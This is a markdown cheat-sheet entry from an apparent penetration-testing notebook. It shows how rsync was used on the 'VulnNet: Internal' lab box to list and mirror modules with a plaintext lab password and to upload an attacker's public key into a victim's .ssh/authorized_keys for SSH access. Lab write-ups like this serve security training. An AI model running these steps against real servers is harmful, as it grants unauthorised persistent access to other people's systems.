# rsync

File-synchronization tool that doubles as a transport. When the server runs `rsyncd` on `873/tcp`, each configured module is a remote path addressable via `rsync://`. We use it both as a read channel (mirror the module) and as a write channel (drop `authorized_keys` into a user's `.ssh/`).

## Commands Used

### List remote modules
```bash
rsync --list-only rsync://$TARGET/
rsync --list-only rsync://rsync-connect@$TARGET/
```
Used on: **VulnNet: Internal** — enumerated `files` module.

### Prepare a password file (required by `--password-file`)
```bash
echo "Hcg3HP67@TW@Bc72v" > /tmp/rsync.pass
chmod 600 /tmp/rsync.pass
```
Used on: **VulnNet: Internal**

### Download (mirror) a module locally
```bash
rsync -av --password-file=/tmp/rsync.pass \
  rsync-connect@$TARGET::files ./rsync_files/
```
Used on: **VulnNet: Internal** — mirrored the `files` module, which contained `sys-internal/` home.

Flags:
- `-a` — archive (preserves perms, times, symlinks, recurses)
- `-v` — verbose
- `-P` — progress + partial resume
- `-n` / `--dry-run` — preview

### Upload (write) into a module
```bash
rsync --password-file=/tmp/rsync.pass authorized_keys \
  rsync://rsync-connect@$TARGET/files/sys-internal/.ssh/
```
Used on: **VulnNet: Internal** — dropped the attacker's pubkey as `authorized_keys` in the victim user's `.ssh/`, enabling SSH login.

### Equivalent URL forms
Both of these work:
```bash
rsync -av --password-file=/tmp/rsync.pass rsync-connect@$TARGET::files/path/ ./local/
rsync -av --password-file=/tmp/rsync.pass rsync://rsync-connect@$TARGET/files/path/ ./local/
```

## Related
- [rsync module abuse playbook](../../exploits/network-services/rsync-module-abuse.md)
- [ssh](../pivot/ssh.md) — follow-up foothold after pushing `authorized_keys`


